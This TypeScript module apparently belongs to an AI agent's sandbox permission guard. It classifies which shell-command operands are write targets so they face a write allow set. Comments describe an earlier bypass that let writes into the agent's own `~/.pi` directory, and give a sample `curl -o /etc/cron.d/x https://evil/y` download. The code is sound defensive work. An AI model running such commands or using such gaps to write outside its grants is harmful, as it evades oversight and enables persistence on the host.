/**
 * Write-role semantics (G3).
 *
 * The manual path asked one location question — "may this path be READ?" — and
 * every write verb answered it with the same predicate. `~/.pi` is
 * read-allowed (skills, extensions), so `mkdir ~/.pi/agent/pwned-dir` and
 * `touch ~/.pi/agent/pwned-file` sailed through: nothing distinguished the
 * operand a command WRITES from one it reads.
 *
 * This module is the closed-world answer: for each command, which operand
 * position IS a write target. The parser mints those operands into a second
 * path set (`writePaths`, a subset of `paths`); the decision layer checks that
 * set against the WRITE allow set only — cwd ∪ config write dirs ∪ the
 * session's write grants. A read grant never satisfies a write.
 *
 * Closed world on purpose. A command with no entry contributes no write
 * operand: its operands still face the read bar (when it is path-aware at
 * all) and its signature grant stays exact, so an unlisted command is no
 * looser than before — it simply cannot be location-scoped by a path grant.
 * Every entry below names what the program itself writes, in the program's
 * own argument syntax.
 */

/** Every location operand is a write target: the verb mutates or creates what
 *  it names. `gzip`/`gunzip`/`xz` write a derived file NEXT TO each operand,
 *  so the operand's directory is the location at risk — naming the operand is
 *  how the bar sees the derived target. `mktemp`'s operand is a template: the
 *  file lands where the template says. */
const WRITE_ALL = new Set([
  "rm", "rmdir", "unlink", "mkdir", "touch", "truncate", "tee",
  "chmod", "chown", "chgrp", "mktemp",
  "gzip", "gunzip", "bzip2", "bunzip2", "xz", "unxz",
]);

/** The LAST location operand is the destination (the rest are sources).
 *  One operand alone is an error or a no-op, so nothing is claimed.
 *  `ln` belongs here, not in WRITE_ALL: `ln -s ~/.pi/…/SKILL.md ./S.md` reads
 *  nothing outside the link location — naming the target as a write would
 *  demand write access to a file the command never touches. */
const WRITE_LAST = new Set(["mv", "cp", "install", "split", "ln"]);

/** The FIRST location operand is the destination (`zip ARCHIVE src…`,
 *  `patch FILE <diff`). A single operand counts: `patch f < d` has one and it
 *  is the file being rewritten. */
const WRITE_FIRST = new Set(["zip", "patch"]);

/** Location operands become writes only when the in-place flag is present:
 *  `sed 's/a/b/' f` reads f, `sed -i 's/a/b/' f` rewrites it. The same
 *  per-token test analysis/cwd-tracking uses for the base flag, so the two
 *  layers cannot disagree about whether a `sed` invocation edits. */
const WRITE_IN_PLACE = new Set(["sed", "perl"]);
const SED_IN_PLACE_RE = /^-[a-bd-gj-zA-Z]*i[^\s/]*$/;
const PERL_IN_PLACE_RE = /^-[a-bd-zA-Z]*i[^\s/]*$/;

/** Flags whose VALUE is a write target, per command — a flag is never
 *  write-flagged across the board (`sort -o FILE` writes, `grep -o` prints).
 *  `-o=x`/`--output=x` (inline) and `-o x` (separate) are both handled. */
const WRITE_FLAGS: Record<string, string[]> = {
  cp: ["-t", "--target-directory"],
  mv: ["-t", "--target-directory"],
  install: ["-t", "--target-directory"],
  sort: ["-o", "--output"],
  patch: ["-o", "--output-file"],
  unzip: ["-d", "--directory"],
  find: ["-fprint", "-fprintf", "-fls"],
  // The fetched file of a download. `-O`/`--remote-name` (and bare `wget URL`)
  // name the basename in the CURRENT base, so nothing outside is minted and the
  // cwd write bar already covers them; `-o`/`-O` here is the form that states a
  // path outright (`curl -o /etc/cron.d/x https://evil/y`).
  curl: ["-o", "--output"],
  wget: ["-O", "--output-document", "-o", "--output-file"],
};

/** The flags that NAME the destination outright. When one is present the
 *  positionals are all sources — `cp -t DIR a b` writes DIR, not `b` — so the
 *  last-positional rule must not claim an operand. */
const TARGET_DIR_FLAGS = ["-t", "--target-directory"];

/** `find` empties the directories it searches when `-delete` is present. */
const WRITE_ALL_WHEN_FLAG: Record<string, string> = { find: "-delete" };

/** A command whose archive operand is written or read depending on the mode
 *  letter: `tar cf out.tar .` writes out.tar, `tar xf in.tar` reads it. */
const TAR_MODE_RE = /(?:^|\s)-?[rcuuta](?:[a-zA-Z]*f[a-zA-Z]*)?\b/;
const TAR_READ_MODE_RE = /^-[a-zA-Z]*[xt](?:[a-zA-Z]*f[a-zA-Z]*)?$/;

function tarWrites(args: string[]): boolean {
  if (args.some((a) => /^--(?:create|append|update|concatenate)$/.test(a))) return true;
  if (args.some((a) => TAR_READ_MODE_RE.test(a) || /^--(?:list|extract|diff|print)$/.test(a))) return false;
  return args.some((a) => TAR_MODE_RE.test(a));
}

/**
 * Which operand indices of `args` (arguments AFTER the command word) name a
 * location the command writes. Indices are the parser's: for an inline
 * `--output=VALUE` the FLAG token carries the value, so the flag index is
 * returned; for a separate value the VALUE token's index is returned.
 *
 * `skipArgs` is the parser's file-operand exclusion set (nonFileArgIndices) —
 * an interpreter's inline program or a grep pattern is data, never a
 * destination, so the two layers share one notion of "file operand".
 */
export function writeOperandIndices(
  cmd: string,
  args: string[],
  skipArgs: Set<number>,
): Set<number> {
  const out = new Set<number>();
  if (!cmd) return out;

  const flags = WRITE_FLAGS[cmd];
  const all = WRITE_ALL.has(cmd)
    || (WRITE_ALL_WHEN_FLAG[cmd] !== undefined && args.includes(WRITE_ALL_WHEN_FLAG[cmd]));
  const targetDirGiven = TARGET_DIR_FLAGS.some((f) => args.includes(f) || args.some((a) => a.startsWith(`${f}=`)));
  const last = WRITE_LAST.has(cmd) && !targetDirGiven;
  const first = WRITE_FIRST.has(cmd);
  const inPlace = WRITE_IN_PLACE.has(cmd)
    && args.some((a) => (cmd === "sed"
      ? SED_IN_PLACE_RE.test(a) || a.startsWith("--in-place")
      : PERL_IN_PLACE_RE.test(a)));
  const tarArchive = cmd === "tar" ? tarWrites(args) : false;
  if (!all && !last && !first && !inPlace && !flags && !tarArchive) return out;

  const positionals: number[] = [];
  for (let i = 0; i < args.length; i++) {
    const a = args[i];
    if (a.startsWith("-")) {
      const eq = a.indexOf("=");
      const name = eq > 0 ? a.slice(0, eq) : a;
      if (flags?.includes(name)) {
        if (eq > 0) {
          if (!skipArgs.has(i)) out.add(i);
        } else if (args[i + 1] !== undefined && !args[i + 1].startsWith("-") && !skipArgs.has(i + 1)) {
          out.add(i + 1);
          i++;
        }
      }
      continue;
    }
    if (skipArgs.has(i) || /^\d+$/.test(a)) continue;
    positionals.push(i);
  }
  if (all || inPlace) positionals.forEach((i) => out.add(i));
  if (last && positionals.length >= 2) out.add(positionals[positionals.length - 1]);
  if (first && positionals.length >= 1) out.add(positionals[0]);
  if (tarArchive) {
    // The archive operand: the value of -f/--file (separate or inline), the
    // token after a mode bundle carrying `f` (`tar -czf out.tar`, and the
    // legacy dashless `tar cf out.tar`), or the first positional when the mode
    // came from a long flag (`tar --create out.tar`). The dashless bundle is
    // anchored to a mode letter so an operand named `config` is not mistaken
    // for a second bundle.
    let longMode = false;
    for (let i = 0; i < args.length; i++) {
      const a = args[i];
      if (a === "--") break;
      if (a.startsWith("-")) {
        const eq = a.indexOf("=");
        const name = eq > 0 ? a.slice(0, eq) : a;
        if (/^-f$|^--file$/.test(name)) {
          if (eq > 0) out.add(i);
          else {
            const v = args[i + 1];
            if (v !== undefined && !v.startsWith("-")) out.add(i + 1);
          }
          break;
        }
        if (/^-[a-zA-Z]*f[a-zA-Z]*$/.test(a)) {
          const v = args[i + 1];
          if (v !== undefined && !v.startsWith("-")) out.add(i + 1);
          break;
        }
        if (/^--(?:create|append|update|concatenate)$/.test(a)) longMode = true;
        continue;
      }
      if (/^[rcuuta](?:[a-zA-Z]*f[a-zA-Z]*)?$/.test(a)) {
        if (a.includes("f")) {
          const v = args[i + 1];
          if (v !== undefined && !v.startsWith("-")) out.add(i + 1);
        }
        break;
      }
      if (longMode && !skipArgs.has(i)) out.add(i);
      break;
    }
  }
  return out;
}
